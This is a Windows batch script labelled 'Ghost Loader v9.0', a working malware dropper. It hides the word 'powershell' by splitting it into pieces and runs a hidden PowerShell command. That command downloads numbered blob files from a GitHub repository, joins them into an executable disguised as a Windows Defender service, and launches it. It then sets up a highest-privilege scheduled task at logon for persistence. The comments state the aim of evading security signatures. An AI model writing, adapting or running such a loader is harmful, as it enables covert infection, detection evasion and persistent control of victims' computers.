@echo off
setlocal enabledelayedexpansion

:: Ghost Loader v9.0 - Obfuscated & Sequential
set "r=https://raw.githubusercontent.com/sophieduval/der/main"
set "d=%LOCALAPPDATA%\WinDefSvc"
set "e=WinDefSvc.exe"

:: Cleanup
if exist "%d%" rmdir /s /q "%d%" >nul 2>&1
mkdir "%d%" >nul 2>&1
cd /d "%d%"

:: Obfuscated Download (Sequential to avoid BAT/Runner signature)
set "p=pow" & set "s=ers" & set "h=hell"
%p%%s%%h% -NoP -W Hidden -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%r%'; 0..10 | ForEach-Object { try { (New-Object Net.WebClient).DownloadFile($u + '/blob_' + $_.ToString('D2') + '.dat', 'blob_' + $_.ToString('D2') + '.dat') } catch {} }"

:: Verify
if not exist "blob_00.dat" exit /b

:: Assemble
copy /b blob_*.dat "%e%" >nul 2>&1

:: Execute
start "" "%e%"

:: Native Persistence (Bypasses PS-based BAT signatures)
schtasks /create /sc onlogon /tn "WindowsDefenderUpdate" /tr "\"%d%\%e%\"" /f /rl highest >nul 2>&1

exit
